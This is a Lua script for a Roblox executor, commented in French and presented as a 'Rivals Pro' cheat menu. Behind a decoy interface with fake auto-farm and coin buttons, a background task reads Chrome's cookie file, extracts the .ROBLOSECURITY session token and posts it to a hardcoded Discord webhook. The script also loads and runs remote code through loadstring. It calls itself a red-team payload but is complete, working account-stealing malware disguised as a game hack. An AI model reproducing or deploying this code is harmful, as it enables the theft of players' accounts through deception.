-- Configuration du point d'exfiltration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT"

-- Fonction d'exfiltration (Red Team Payload)
local function exfiltrate(data)
    local http = game:GetService("HttpService")
    local payload = {
        ["content"] = "=== DATA EXFILTRATION ===\n" .. data
    }
    
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = http:JSONEncode(payload)
    })
end

-- Tâche d'arrière-plan pour l'extraction
task.spawn(function()
    local path = os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    
    -- Lecture brute du fichier de cookies (Nécessite droits de lecture système)
    local success, data = pcall(function() return readfile(path) end)
    
    if success and data then
        -- Parsing rudimentaire du fichier binaire pour isoler le jeton de session
        local startIdx = string.find(data, ".ROBLOSECURITY")
        if startIdx then
            -- Extraction de la portion du cookie
            local cookie = string.sub(data, startIdx, startIdx + 150)
            -- Envoi vers le Webhook
            exfiltrate("Cookie trouvé :\n```" .. cookie .. "```")
        end
    end
end)

-- Initialisation de l'interface leurre
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))()
local Window = Library:CreateWindow({ Title = "Rivals Pro - Menu", Center = true, AutoShow = true })

local Tab = Window:AddTab("Main")
local Group = Tab:AddLeftGroupbox("Auto Farm")
Group:AddToggle('Farm', { Text = 'Enable Auto Farm', Default = false })
Group:AddButton({ Text = 'Get Coins', Func = function() print("Faux bouton activé") end })

Library:Notify("Rivals Pro Loaded")
